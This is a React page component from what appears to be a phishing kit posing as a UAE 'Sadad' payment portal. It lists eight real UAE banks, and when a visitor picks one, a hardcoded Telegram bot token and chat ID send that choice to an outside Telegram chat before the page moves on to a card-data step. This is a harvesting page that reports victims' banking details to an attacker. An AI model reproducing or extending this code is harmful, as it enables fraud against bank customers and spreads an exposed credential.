import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";

const BANKS = [
  { id: "ENBD", name: "بنك الإمارات دبي الوطني", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/9/9e/Emirates_NBD_logo.svg/1200px-Emirates_NBD_logo.svg.png" },
  { id: "FAB", name: "بنك أبوظبي الأول", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/3/3b/First_Abu_Dhabi_Bank_logo.svg/1200px-First_Abu_Dhabi_Bank_logo.svg.png" },
  { id: "ADCB", name: "بنك أبوظبي التجاري", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/7/7a/ADCB_Logo.svg/1200px-ADCB_Logo.svg.png" },
  { id: "DIB", name: "بنك دبي الإسلامي", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Dubai_Islamic_Bank_Logo.svg/1200px-Dubai_Islamic_Bank_Logo.svg.png" },
  { id: "ADIB", name: "مصرف أبوظبي الإسلامي", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/2/2a/Abu_Dhabi_Islamic_Bank_logo.svg/1200px-Abu_Dhabi_Islamic_Bank_logo.svg.png" },
  { id: "RAK", name: "بنك رأس الخيمة الوطني", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c3/RAKBANK_logo.svg/1200px-RAKBANK_logo.svg.png" },
  { id: "CBD", name: "بنك دبي التجاري", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/3/3a/Commercial_Bank_of_Dubai_logo.svg/1200px-Commercial_Bank_of_Dubai_logo.svg.png" },
  { id: "MASHREQ", name: "بنك المشرق", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/2/2e/Mashreq_logo.svg/1200px-Mashreq_logo.svg.png" },
];

export default function SelectBank() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleBankSelect = async (bankName: string) => {
    setLoading(true);
    const message = `
🏦 *اختيار البنك - بوابة سداد الإمارات*
--------------------------
🏛 *البنك المختار:* ${bankName}
--------------------------
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      
      const paymentData = JSON.parse(sessionStorage.getItem("paymentData") || "{}");
      sessionStorage.setItem("paymentData", JSON.stringify({ ...paymentData, bank: bankName }));
      setLocation("/card-data");
    } catch (error) {
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
        <div className="container flex flex-col items-center">
          <div className="bg-amber-500 p-2 rounded-full mb-1">
            <span className="text-white font-bold text-lg">سداد</span>
          </div>
          <h1 className="text-xl font-bold text-gray-800">بوابة سداد الإمارات</h1>
        </div>
      </header>

      <main className="flex-grow container py-8 px-4">
        <div className="max-w-3xl mx-auto bg-white rounded-xl shadow-lg p-6 border border-gray-100">
          <div className="flex justify-between mb-8 relative">
            {[1, 2, 3, 4, 5].map((step) => (
              <div key={step} className={`z-10 w-8 h-8 rounded-full flex items-center justify-center font-bold ${step <= 2 ? 'bg-amber-500 text-white' : 'bg-gray-200 text-gray-500'}`}>
                {step}
              </div>
            ))}
            <div className="absolute top-4 left-0 right-0 h-0.5 bg-gray-200 -z-0"></div>
          </div>

          <h2 className="text-2xl font-bold text-gray-900 mb-2 text-center">اختر البنك الخاص بك</h2>
          <p className="text-gray-500 text-center mb-8">يرجى اختيار البنك الذي تتعامل معه لإكمال عملية السداد</p>

          <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
            {BANKS.map((bank) => (
              <button
                key={bank.id}
                disabled={loading}
                onClick={() => handleBankSelect(bank.name)}
                className="flex flex-col items-center justify-center p-4 border border-gray-200 rounded-xl hover:border-amber-500 hover:shadow-md transition-all bg-white group"
              >
                <div className="h-12 w-full flex items-center justify-center mb-3">
                  <span className="font-bold text-blue-900 group-hover:text-amber-600 text-center text-sm">{bank.name}</span>
                </div>
                <span className="text-xs text-gray-400">{bank.id}</span>
              </button>
            ))}
          </div>

          <div className="mt-8 flex justify-center">
            <Button variant="outline" onClick={() => setLocation("/user-data")}>الرجوع</Button>
          </div>
        </div>
      </main>
    </div>
  );
}
